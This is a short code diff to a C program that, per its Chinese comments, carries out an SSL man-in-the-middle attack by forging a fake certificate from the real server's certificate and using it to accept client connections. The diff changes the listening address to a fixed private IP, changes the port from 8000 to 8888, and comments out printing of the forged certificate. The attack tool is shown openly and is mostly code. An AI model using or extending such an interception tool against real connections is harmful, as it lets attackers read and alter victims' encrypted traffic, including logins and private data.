@@ -68,7 +68,8 @@ int socket_to_client_init(short int port)
         error("reuseaddr error!");
     }  
     memset(&addr, 0, sizeof(addr));
-    addr.sin_addr.s_addr = htonl(INADDR_ANY);
+	addr.sin_addr.s_addr = inet_addr("192.168.60.128");
+    //addr.sin_addr.s_addr = INADDR_ANY;
     addr.sin_family = AF_INET;
     //将该socket绑定到8888端口上
     addr.sin_port = htons(port);
@@ -333,7 +334,7 @@ int transfer(SSL *ssl_to_client, SSL *ssl_to_server)
 int main() 
 {
     // 初始化一个socket，将该socket绑定到443端口，并监听
-    int socket = socket_to_client_init(8000);
+    int socket = socket_to_client_init(8888);
     // 从文件读取伪造SSL证书时需要的RAS私钥和公钥
     EVP_PKEY* key = create_key();
     // 初始化openssl库
@@ -366,7 +367,7 @@ int main()
 
             // 从服务器获得证书，并通过这个证书伪造一个假的证书
             fake_x509 = create_fake_certificate(ssl_to_server, key);
-			printf("the fake cert is : \n%s\n",fake_x509);
+			//printf("the fake cert is : \n%s\n",fake_x509);
             // 使用假的证书和我们自己的密钥，和客户端建立一个SSL连接。至此，SSL中间人攻击成功
             ssl_to_client = SSL_to_client_init(socket_to_client, fake_x509, key);
             if (SSL_accept(ssl_to_client) <= 0)
